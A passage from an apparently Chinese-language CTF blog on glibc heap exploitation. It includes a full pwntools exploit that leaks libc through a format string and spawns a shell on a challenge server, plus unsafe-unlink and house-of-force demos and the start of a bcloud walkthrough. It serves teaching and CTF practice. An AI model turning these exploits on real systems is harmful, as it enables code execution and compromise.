class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div><div class=\"line\">46</div><div class=\"line\">47</div><div class=\"line\">48</div><div class=\"line\">49</div><div class=\"line\">50</div><div class=\"line\">51</div><div class=\"line\">52</div><div class=\"line\">53</div><div class=\"line\">54</div><div class=\"line\">55</div><div class=\"line\">56</div><div class=\"line\">57</div><div class=\"line\">58</div><div class=\"line\">59</div><div class=\"line\">60</div><div class=\"line\">61</div><div class=\"line\">62</div><div class=\"line\">63</div><div class=\"line\">64</div><div class=\"line\">65</div><div class=\"line\">66</div><div class=\"line\">67</div><div class=\"line\">68</div><div class=\"line\">69</div><div class=\"line\">70</div><div class=\"line\">71</div><div class=\"line\">72</div><div class=\"line\">73</div><div class=\"line\">74</div><div class=\"line\">75</div><div class=\"line\">76</div><div class=\"line\">77</div><div class=\"line\">78</div><div class=\"line\">79</div><div class=\"line\">80</div><div class=\"line\">81</div></pre></td><td class=\"code\"><pre><div class=\"line\">from pwn import *</div><div class=\"line\"></div><div class=\"line\">context.log_level = <span class=\"string\">'debug'</span></div><div class=\"line\">global <span class=\"built_in\">io</span></div><div class=\"line\">libc = ELF(<span class=\"string\">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</div><div class=\"line\">elf = ELF(<span class=\"string\">'./pwn-f'</span>)</div><div class=\"line\"></div><div class=\"line\">def create_list(<span class=\"built_in\">io</span>,length,strr):</div><div class=\"line\">\t<span class=\"built_in\">io</span>.recvuntil(<span class=\"string\">'quit'</span>)</div><div class=\"line\">\t<span class=\"built_in\">io</span>.sendline(<span class=\"string\">'create '</span>)</div><div class=\"line\">\t<span class=\"built_in\">io</span>.recvuntil(<span class=\"string\">'Pls give string size:'</span>)</div><div class=\"line\">\t<span class=\"built_in\">io</span>.sendline(length)</div><div class=\"line\">\t<span class=\"built_in\">io</span>.recvuntil(<span class=\"string\">'str:'</span>)</div><div class=\"line\">\t<span class=\"built_in\">io</span>.sendline(strr)</div><div class=\"line\"></div><div class=\"line\">def delete_list(<span class=\"built_in\">io</span>,number):</div><div class=\"line\">\t<span class=\"built_in\">io</span>.recvuntil(<span class=\"string\">'quit'</span>)</div><div class=\"line\">\t<span class=\"built_in\">io</span>.sendline(<span class=\"string\">'delete '</span>)</div><div class=\"line\">\t<span class=\"built_in\">io</span>.recvuntil(<span class=\"string\">'id:'</span>)</div><div class=\"line\">\t<span class=\"built_in\">io</span>.sendline(number)</div><div class=\"line\">\t<span class=\"built_in\">io</span>.recvuntil(<span class=\"string\">'Are you sure?:'</span>)</div><div class=\"line\">\t<span class=\"built_in\">io</span>.sendline(<span class=\"string\">'yes'</span>)</div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\">def pwn():</div><div class=\"line\">\tglobal <span class=\"built_in\">io</span></div><div class=\"line\"></div><div class=\"line\">\t<span class=\"built_in\">debug</span> = <span class=\"number\">1</span></div><div class=\"line\">\t<span class=\"keyword\">if</span> <span class=\"built_in\">debug</span>:</div><div class=\"line\">   \t \t<span class=\"built_in\">io</span> = process(<span class=\"string\">'./pwn-f'</span>)</div><div class=\"line\">\t<span class=\"keyword\">else</span>:</div><div class=\"line\">\t\t#<span class=\"built_in\">io</span> = remote(<span class=\"string\">'127.0.0.1'</span>,<span class=\"number\">2333</span>)</div><div class=\"line\">\t\t<span class=\"built_in\">io</span> = remote(<span class=\"string\">'115.28.78.54'</span>,<span class=\"number\">80</span>)</div><div class=\"line\">\t\t<span class=\"built_in\">io</span>.recvuntil(<span class=\"string\">'please input you token: '</span>)</div><div class=\"line\">\t\t<span class=\"built_in\">io</span>.sendline(<span class=\"string\">'b66888c818c08d932ea91b8d6a1f122c2y7ZAdbh'</span>)</div><div class=\"line\">#<span class=\"comment\">------------------------------------------------use fsb to leak __libc_start_main's address</span></div><div class=\"line\">\tcreate_list(<span class=\"built_in\">io</span>,<span class=\"string\">'10'</span>,<span class=\"string\">'aaaa'</span>)</div><div class=\"line\">\tcreate_list(<span class=\"built_in\">io</span>,<span class=\"string\">'10'</span>,<span class=\"string\">'bbbb'</span>)</div><div class=\"line\">\tcreate_list(<span class=\"built_in\">io</span>,<span class=\"string\">'10'</span>,<span class=\"string\">'cccc'</span>)</div><div class=\"line\">\tdelete_list(<span class=\"built_in\">io</span>,<span class=\"string\">'0'</span>)</div><div class=\"line\">\tdelete_list(<span class=\"built_in\">io</span>,<span class=\"string\">'1'</span>)</div><div class=\"line\">\tdelete_list(<span class=\"built_in\">io</span>,<span class=\"string\">'2'</span>)</div><div class=\"line\">\tcontent1 = <span class=\"string\">\"%175$p\"</span>.ljust(<span class=\"number\">24</span>,<span class=\"string\">'a'</span>)+<span class=\"string\">'\\xd0\\xf9\\x00'</span></div><div class=\"line\">\tcreate_list(<span class=\"built_in\">io</span>,<span class=\"string\">'29'</span>,content1)</div><div class=\"line\">\tdelete_list(<span class=\"built_in\">io</span>,<span class=\"string\">'1'</span>)                     #<span class=\"comment\">-----printf('%113$p')</span></div><div class=\"line\"></div><div class=\"line\">\tdata = <span class=\"built_in\">io</span>.recv(<span class=\"number\">14</span>)</div><div class=\"line\">\tlibc_start_main = int(data,<span class=\"number\">16</span>)<span class=\"number\">-240</span></div><div class=\"line\">\t<span class=\"built_in\">print</span> <span class=\"string\">\"libc_start_main_addr=\"</span>+hex(libc_start_main)</div><div class=\"line\">#<span class=\"comment\">--------------------------------------------------caculate system_addr\t</span></div><div class=\"line\">\tlibc_start_main_offset = libc.symbols[<span class=\"string\">'__libc_start_main'</span>]</div><div class=\"line\">\tsystem_addr = libc.symbols[<span class=\"string\">'system'</span>]</div><div class=\"line\">\tsystem_addr = libc_start_main  - libc_start_main_offset + system_addr</div><div class=\"line\">\t<span class=\"built_in\">print</span> <span class=\"string\">\"system_addr=\"</span> + hex(system_addr)</div><div class=\"line\"></div><div class=\"line\">\tcreate_list(<span class=\"built_in\">io</span>,<span class=\"string\">'10'</span>,<span class=\"string\">'zzzz\\x00'</span>)</div><div class=\"line\"></div><div class=\"line\">\tcreate_list(<span class=\"built_in\">io</span>,<span class=\"string\">'10'</span>,<span class=\"string\">'aaaa\\x00'</span>)</div><div class=\"line\">\tcreate_list(<span class=\"built_in\">io</span>,<span class=\"string\">'10'</span>,<span class=\"string\">'bbbb\\x00'</span>)</div><div class=\"line\">\tcreate_list(<span class=\"built_in\">io</span>,<span class=\"string\">'10'</span>,<span class=\"string\">'cccc\\x00'</span>)</div><div class=\"line\">\tdelete_list(<span class=\"built_in\">io</span>,<span class=\"string\">'2'</span>)</div><div class=\"line\">\tdelete_list(<span class=\"built_in\">io</span>,<span class=\"string\">'3'</span>)</div><div class=\"line\">\tdelete_list(<span class=\"built_in\">io</span>,<span class=\"string\">'4'</span>)</div><div class=\"line\">#<span class=\"comment\">----------can't have '\\x00' in string.because len(string) must &gt;15.And after '/bin/sh' must have a space.</span></div><div class=\"line\">\tcontent2 = <span class=\"string\">\"/bin/sh #\"</span>.ljust(<span class=\"number\">24</span>,<span class=\"string\">'a'</span>)+ p64(system_addr)  </div><div class=\"line\">\tcreate_list(<span class=\"built_in\">io</span>,<span class=\"string\">'32'</span>,content2)</div><div class=\"line\">\tdelete_list(<span class=\"built_in\">io</span>,<span class=\"string\">'3'</span>)                     #system(<span class=\"string\">'/bin/sh'</span>)</div><div class=\"line\">\t</div><div class=\"line\">\t<span class=\"built_in\">io</span>.sendline(<span class=\"string\">'uname -a'</span>)</div><div class=\"line\">\t<span class=\"built_in\">io</span>.interactive()</div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">'__main__'</span>:</div><div class=\"line\">\t<span class=\"keyword\">while</span> True:</div><div class=\"line\">\t\ttry:</div><div class=\"line\">\t\t\tpwn()</div><div class=\"line\">\t\texcept EOFError:</div><div class=\"line\">\t\t\t<span class=\"built_in\">print</span> <span class=\"string\">'guess not success!!!'</span></div><div class=\"line\">\t\t\t<span class=\"built_in\">io</span>.close()</div><div class=\"line\">\t\t\ttime.sleep(<span class=\"number\">0.5</span>)</div></pre></td></tr></table></figure>\n<h2 id=\"0x04-unsafe-unlink\"><a href=\"#0x04-unsafe-unlink\" class=\"headerlink\" title=\"0x04 unsafe unlink\"></a>0x04 unsafe unlink</h2><p>这里的unlink分为两种，一个释放堆块的相邻堆块共有两个，当<strong>前一个堆块</strong>空闲时，<strong>向后合并</strong>；当<strong>后一个堆块</strong>空闲时，<strong>向前合并</strong>。</p>\n<p>glibc的unlink宏（简化版）：<br><figure class=\"highlight mipsasm\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div></pre></td><td class=\"code\"><pre><div class=\"line\">FD = P-&gt;fd<span class=\"comment\">;</span></div><div class=\"line\"><span class=\"keyword\">BK </span>= P-&gt;<span class=\"keyword\">bk;</span></div><div class=\"line\">if(FD-&gt;<span class=\"keyword\">bk </span>== P &amp;&amp; <span class=\"keyword\">BK-&gt;fd </span>== P)</div><div class=\"line\">&#123;</div><div class=\"line\">\tFD-&gt;<span class=\"keyword\">bk </span>= P<span class=\"comment\">;</span></div><div class=\"line\">\t<span class=\"keyword\">BK-&gt;fd </span>= P<span class=\"comment\">;</span></div><div class=\"line\">&#125;</div></pre></td></tr></table></figure></p>\n<p>当我们存在向后合并的情况时：<br><figure class=\"highlight mipsasm\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\">/*</span></div><div class=\"line\">| chunk1(p1) | chunk2(p2) |</div><div class=\"line\">*/</div><div class=\"line\"><span class=\"comment\">#include &lt;stdio.h&gt;</span></div><div class=\"line\"></div><div class=\"line\">void *ptr<span class=\"comment\">;</span></div><div class=\"line\"></div><div class=\"line\">int main()</div><div class=\"line\">&#123;</div><div class=\"line\">\tint prev_size, size, fd, <span class=\"keyword\">bk;</span></div><div class=\"line\">\tvoid *p1, *p2<span class=\"comment\">;</span></div><div class=\"line\">\tchar <span class=\"keyword\">buf[253] </span>= <span class=\"string\">\"\"</span><span class=\"comment\">;</span></div><div class=\"line\"></div><div class=\"line\">\tp1 = malloc(<span class=\"number\">252</span>)<span class=\"comment\">;</span></div><div class=\"line\">\tp2 = malloc(<span class=\"number\">252</span>)<span class=\"comment\">;</span></div><div class=\"line\"></div><div class=\"line\">\tptr = p1<span class=\"comment\">;</span></div><div class=\"line\">\tprev_size = <span class=\"number\">0</span><span class=\"comment\">;</span></div><div class=\"line\">\tsize = <span class=\"number\">249</span><span class=\"comment\">;</span></div><div class=\"line\">\tfd = (int)(&amp;ptr) - <span class=\"number\">0xc</span><span class=\"comment\">;</span></div><div class=\"line\">\t<span class=\"keyword\">bk </span>= (int)(&amp;ptr) - <span class=\"number\">0x8</span><span class=\"comment\">;</span></div><div class=\"line\"></div><div class=\"line\">\tmemset(<span class=\"keyword\">buf, </span><span class=\"string\">'c'</span>, <span class=\"number\">253</span>)<span class=\"comment\">;</span></div><div class=\"line\">\tmemcpy(<span class=\"keyword\">buf, </span>&amp;prev_size, <span class=\"number\">4</span>)<span class=\"comment\">;</span></div><div class=\"line\">\tmemcpy(<span class=\"keyword\">buf+4, </span>&amp;size, <span class=\"number\">4</span>)<span class=\"comment\">;</span></div><div class=\"line\">\tmemcpy(<span class=\"keyword\">buf+8, </span>&amp;fd, <span class=\"number\">4</span>)<span class=\"comment\">;</span></div><div class=\"line\">\tmemcpy(<span class=\"keyword\">buf+12, </span>&amp;<span class=\"keyword\">bk, </span><span class=\"number\">4</span>)<span class=\"comment\">;</span></div><div class=\"line\">\tsize = <span class=\"number\">248</span><span class=\"comment\">;</span></div><div class=\"line\">\tmemcpy(&amp;<span class=\"keyword\">buf[248], </span>&amp;size, <span class=\"number\">4</span>)<span class=\"comment\">;</span></div><div class=\"line\">\t<span class=\"keyword\">buf[252] </span>= <span class=\"string\">'\\x00'</span><span class=\"comment\">;</span></div><div class=\"line\"></div><div class=\"line\">\tmemcpy(p1, <span class=\"keyword\">buf, </span><span class=\"number\">253</span>)<span class=\"comment\">;</span></div><div class=\"line\">\tfree(p2)<span class=\"comment\">;</span></div><div class=\"line\">\treturn <span class=\"number\">0</span><span class=\"comment\">;</span></div><div class=\"line\">&#125;</div></pre></td></tr></table></figure></p>\n<p>此时我们free掉p2的话，由于我们伪造了chunk2的pre_presize和pre_inuse位，会使得向后合并的情况发生，fake_chunk会向后融合。再来观察unlink宏<br><figure class=\"highlight nix\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\">/*P为fake_chunk，由chunk2-&gt;pre_size得到</span></div><div class=\"line\">P == ptr;</div><div class=\"line\">*/</div><div class=\"line\"><span class=\"attr\">FD</span> = P-&gt;fd;                     // <span class=\"attr\">FD</span> = P-&gt;<span class=\"attr\">fd</span> = &amp;ptr - <span class=\"number\">0</span><span class=\"attr\">xc</span> = *(ptr + <span class=\"number\">0</span>x8)</div><div class=\"line\"><span class=\"attr\">BK</span> = P-&gt;bk;                    // <span class=\"attr\">BK</span> = P-&gt;<span class=\"attr\">bk</span> = &amp;ptr - <span class=\"number\">0</span><span class=\"attr\">x8</span> = *(ptr + <span class=\"number\">0</span>xc)</div><div class=\"line\"><span class=\"keyword\">if</span>(FD-&gt;<span class=\"attr\">bk</span> == P &amp;&amp; BK-&gt;<span class=\"attr\">fd</span> == P)</div><div class=\"line\"><span class=\"comment\">/*</span></div><div class=\"line\">\t此时</div><div class=\"line\">    FD-&gt;bk = ptr = *(&amp;ptr - 0xc + 0xc)</div><div class=\"line\">    BK-&gt;fd = ptr = *(&amp;ptr - 0x8 + 0x8)</div><div class=\"line\">    绕过检查</div><div class=\"line\">*/</div><div class=\"line\">&#123;</div><div class=\"line\">\tFD-&gt;<span class=\"attr\">bk</span> = BK;                // FD-&gt;<span class=\"attr\">bk</span> = &amp;ptr - <span class=\"number\">0</span>x8; <span class=\"attr\">ptr</span> == &amp;ptr - <span class=\"number\">0</span>x8;</div><div class=\"line\">\tBK-&gt;<span class=\"attr\">fd</span> = FD;                 // BK-&gt;<span class=\"attr\">fd</span> = &amp;ptr - <span class=\"number\">0</span>xc; <span class=\"attr\">ptr</span> == &amp;ptr - <span class=\"number\">0</span>xc;</div><div class=\"line\">&#125;</div><div class=\"line\"><span class=\"comment\">/*</span></div><div class=\"line\">最后ptr = &amp;ptr - 0xc</div><div class=\"line\">*/</div></pre></td></tr></table></figure></p>\n<h2 id=\"0x05-house-of-spirit\"><a href=\"#0x05-house-of-spirit\" class=\"headerlink\" title=\"0x05 house of spirit\"></a>0x05 house of spirit</h2><h2 id=\"0x09-house-of-force\"><a href=\"#0x09-house-of-force\" class=\"headerlink\" title=\"0x09 house of force\"></a>0x09 house of force</h2><p>我们知道os中存在一个top chunk用来在分配堆块，当我们的bins中不存在合适的堆块时，从top chunk中来切割出合适大小的堆块已分配给用户。</p>\n<p>这里我们来看<code>how2heap</code>中给出的demo</p>\n<p>首先我们定义一个全局变量<code>bss_var</code>，值为<code>This is a string that we want to overwrite.</code></p>\n<p>我们查看下他的地址为<code>0x602060</code><br><figure class=\"highlight lsl\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">pwndbg&gt; p &amp;bss_var </div><div class=\"line\">$<span class=\"number\">3</span> = (char (*)[<span class=\"number\">44</span>]) <span class=\"number\">0x602060</span> &lt;bss_var&gt;</div></pre></td></tr></table></figure></p>\n<p>然后我们分配一个大小256堆块，地址为<code>0x7fffffffdec8</code><br><figure class=\"highlight gams\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">pwndbg&gt; p &amp;p1</div><div class=\"line\"><span class=\"meta\"><span class=\"meta-keyword\">$4</span> = (intptr_t **) 0x7fffffffdec8</span></div></pre></td></tr></table></figure></p>\n<p>由于已使用中的chunk要加上8byte的<code>prev_size</code>和8byte的<code>size</code></p>\n<p>所以真实的chunk的起始地址为<code>0x603410</code><br>此时我们查看堆的地址如下<br><figure class=\"highlight nix\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div></pre></td><td class=\"code\"><pre><div class=\"line\">pwndbg&gt; heap </div><div class=\"line\">Top Chunk: <span class=\"number\">0</span>x603520</div><div class=\"line\">Last Remainder: <span class=\"number\">0</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"number\">0</span>x603000 PREV_INUSE &#123;</div><div class=\"line\">  <span class=\"attr\">prev_size</span> = <span class=\"number\">0</span>, </div><div class=\"line\">  <span class=\"attr\">size</span> = <span class=\"number\">1041</span>, </div><div class=\"line\">  <span class=\"attr\">fd</span> = <span class=\"number\">0</span>x20706f7420656854, </div><div class=\"line\">  <span class=\"attr\">bk</span> = <span class=\"number\">0</span>x7473206b6e756863, </div><div class=\"line\">  <span class=\"attr\">fd_nextsize</span> = <span class=\"number\">0</span>x2074612073747261, </div><div class=\"line\">  <span class=\"attr\">bk_nextsize</span> = <span class=\"number\">0</span>x3832353330367830</div><div class=\"line\">&#125;</div><div class=\"line\"><span class=\"number\">0</span>x603410 PREV_INUSE &#123;</div><div class=\"line\">  <span class=\"attr\">prev_size</span> = <span class=\"number\">0</span>, </div><div class=\"line\">  <span class=\"attr\">size</span> = <span class=\"number\">273</span>, </div><div class=\"line\">  <span class=\"attr\">fd</span> = <span class=\"number\">0</span>x0, </div><div class=\"line\">  <span class=\"attr\">bk</span> = <span class=\"number\">0</span>x0, </div><div class=\"line\">  <span class=\"attr\">fd_nextsize</span> = <span class=\"number\">0</span>x0, </div><div class=\"line\">  <span class=\"attr\">bk_nextsize</span> = <span class=\"number\">0</span>x0</div><div class=\"line\">&#125;</div><div class=\"line\"><span class=\"number\">0</span>x603520 PREV_INUSE &#123;</div><div class=\"line\">  <span class=\"attr\">prev_size</span> = <span class=\"number\">0</span>, </div><div class=\"line\">  <span class=\"attr\">size</span> = <span class=\"number\">133857</span>, </div><div class=\"line\">  <span class=\"attr\">fd</span> = <span class=\"number\">0</span>x0, </div><div class=\"line\">  <span class=\"attr\">bk</span> = <span class=\"number\">0</span>x0, </div><div class=\"line\">  <span class=\"attr\">fd_nextsize</span> = <span class=\"number\">0</span>x0, </div><div class=\"line\">  <span class=\"attr\">bk_nextsize</span> = <span class=\"number\">0</span>x0</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure></p>\n<p>此时原先的top chunk的大小为<code>133857-1</code>(1为flag位)</p>\n<p>我们修改top chunk的size为<code>-1</code>(<code>0xffffffffffffffff</code>)<br>此时，top chunk的大小为<br><figure class=\"highlight lsl\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"number\">0x603520</span> &#123;</div><div class=\"line\">  prev_size = <span class=\"number\">0</span>, </div><div class=\"line\">  size = <span class=\"number\">0</span>, </div><div class=\"line\">  fd = <span class=\"number\">0xffffffffffffffff</span>, </div><div class=\"line\">  bk = <span class=\"number\">0x0</span>, </div><div class=\"line\">  fd_nextsize = <span class=\"number\">0x0</span>, </div><div class=\"line\">  bk_nextsize = <span class=\"number\">0x0</span></div><div class=\"line\">&#125;</div></pre></td></tr></table></figure></p>\n<p>然后我们分配一个正好在我们欲修改位置毗邻的大小的堆块，这样我们在再下一次malloc时我们就可以分配到想要的位置了</p>\n<p>我们分配的大小为<code>unsigned long evil_size = (unsigned long)bss_var - sizeof(long)*3 - (unsigned long)ptr_top;</code><br>也就是<code>0xffffffffffffeb28</code>，得到这样一个大数以实现堆的反向分配</p>\n<p>此时我们再分配就得到了<code>bbs_var</code>了，我们可以对<code>bbs_var</code>做读写操作了</p>\n<h4 id=\"例题-1\"><a href=\"#例题-1\" class=\"headerlink\" title=\"例题\"></a>例题</h4><p>2017zctf的dragon和2016bctf的bclould</p>\n<p>先看2016bctf这题<br>在输入姓名时存在有漏洞的截断，当我们输入<code>i</code>个字符时，是在第<code>i+1</code>的位置添加<code>\\x00</code>然而，但是我们后面看到的地址的赋值操作时，会把<code>\\x00</code>给覆盖掉，当我们<code>strcpy</code>时，就会把堆指针给copy进去。</p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">sub_80487A1</span><span class=\"params\">()</span></span></div><div class=\"line\">&#123;</div><div class=\"line\">  <span class=\"keyword\">char</span> buffer; <span class=\"comment\">// [sp+1Ch] [bp-5Ch]@1</span></div><div class=\"line\">  <span class=\"keyword\">char</span> *_name; <span class=\"comment\">// [sp+5Ch] [bp-1Ch]@1</span></div><div class=\"line\">  <span class=\"keyword\">int</span> v5; <span class=\"comment\">// [sp+6Ch] [bp-Ch]@1</span></div><div class=\"line\"></div><div class=\"line\">  v5 = *MK_FP(__GS__, <span class=\"number\">20</span>);</div><div class=\"line\">  <span class=\"built_in\">memset</span>(&amp;buffer, <span class=\"number\">0</span>, <span class=\"number\">80u</span>);</div><div class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">\"Input your name:\"</span>);</div><div class=\"line\">  read_buf((<span class=\"keyword\">int</span>)&amp;buffer, <span class=\"number\">64</span>, <span class=\"number\">10</span>);</div><div class=\"line\">  _name = (<span class=\"keyword\">char</span> *)<span class=\"built_in\">malloc</span>(<span class=\"number\">64u</span>);</div><div class=\"line\">  name_addr = (<span class=\"keyword\">int</span>)_name;                                     <span class=\"comment\">//这里存在将'\\x00'覆盖的情况</span></div><div class=\"line\">  <span class=\"built_in\">strcpy</span>(_name, &amp;buffer);</div><div class=\"line\">  sub_8048779((<span class=\"keyword\">int</span>)_name);</div><div class=\"line\">  <span class=\"keyword\">return</span> *MK_FP(__GS__, <span class=\"number\">20</span>) ^ v5;</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure>\n<figure class=\"highlight go\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div></pre></td><td class=\"code\"><pre><div class=\"line\">pwndbg&gt; telescope <span class=\"number\">0x915d</span>008 <span class=\"number\">20</span></div><div class=\"line\"><span class=\"number\">00</span>:<span class=\"number\">0000</span>│ eax  <span class=\"number\">0x915d</span>008 ◂— <span class=\"number\">0x61616161</span> (<span class=\"string\">'aaaa'</span>)</div><div class=\"line\">... ↓</div><div class=\"line\"><span class=\"number\">0f</span>:<span class=\"number\">003</span>c│      <span class=\"number\">0x915d</span>044 ◂— <span class=\"number\">0x62616161</span> (<span class=\"string\">'aaab'</span>)</div><div class=\"line\"><span class=\"number\">10</span>:<span class=\"number\">0040</span>│      <span class=\"number\">0x915d</span>048 —▸ <span class=\"number\">0x915d</span>008 ◂— <span class=\"number\">0x61616161</span> (<span class=\"string\">'aaaa'</span>)</div><div class=\"line\"><span class=\"number\">11</span>:<span class=\"number\">0044</span>│ edx  <span class=\"number\">0x915d</span>04c ◂— <span class=\"number\">0x20f</span>00</div><div class=\"line\"><span class=\"number\">12</span>:<span class=\"number\">0048</span>│      <span class=\"number\">0x915d</span>050 ◂— <span class=\"number\">0x0</span></div></pre></td></tr></table></figure>\n<p>这里我们能看到输出的是<code>name_addr</code>这个指针的值。</p>\n<p>接下来的<code>org</code>和<code>host</code>的copy其实也存在这个漏洞。<br><figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">sub_804884E</span><span class=\"params\">()</span></span></div><div class=\"line\">&#123;</div><div class=\"line\">  <span class=\"keyword\">char</span> org; <span class=\"comment\">// [sp+1Ch] [bp-9Ch]@1</span></div><div class=\"line\">  <span class=\"keyword\">char</span> *_org; <span class=\"comment\">// [sp+5Ch] [bp-5Ch]@1</span></div><div class=\"line\">  <span class=\"keyword\">int</span> host; <span class=\"comment\">// [sp+60h] [bp-58h]@1</span></div><div class=\"line\">  <span class=\"keyword\">char</span> *_host; <span class=\"comment\">// [sp+A4h] [bp-14h]@1</span></div><div class=\"line\">  <span class=\"keyword\">int</span> v5; <span class=\"comment\">// [sp+ACh] [bp-Ch]@1</span></div><div class=\"line\"></div><div class=\"line\">  v5 = *MK_FP(__GS__, <span class=\"number\">20</span>);</div><div class=\"line\">  <span class=\"built_in\">memset</span>(&amp;org, <span class=\"number\">0</span>, <span class=\"number\">0x90</span>u);</div><div class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">\"Org:\"</span>);</div><div class=\"line\">  read_buf((<span class=\"keyword\">int</span>)&amp;org, <span class=\"number\">64</span>, <span class=\"number\">10</span>);</div><div class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">\"Host:\"</span>);</div><div class=\"line\">  read_buf((<span class=\"keyword\">int</span>)&amp;host, <span class=\"number\">64</span>, <span class=\"number\">10</span>);</div><div class=\"line\">  _host = (<span class=\"keyword\">char</span> *)<span class=\"built_in\">malloc</span>(<span class=\"number\">64u</span>);</div><div class=\"line\">  _org = (<span class=\"keyword\">char</span> *)<span class=\"built_in\">malloc</span>(<span class=\"number\">64u</span>);</div><div class=\"line\">  org_addr = (<span class=\"keyword\">int</span>)_org;</div><div class=\"line\">  host_addr = (<span class=\"keyword\">int</span>)_host;</div><div class=\"line\">  <span class=\"built_in\">strcpy</span>(_host, (<span class=\"keyword\">const</span> <span class=\"keyword\">char</span> *)&amp;host);</div><div class=\"line\">  <span class=\"built_in\">strcpy</span>(_org, &amp;org);</div><div class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">\"OKay! Enjoy:)\"</span>);</div><div class=\"line\">  <span class=\"keyword\">return</span> *MK_FP(__GS__, <span class=\"number\">20</span>) ^ v5;</div><div 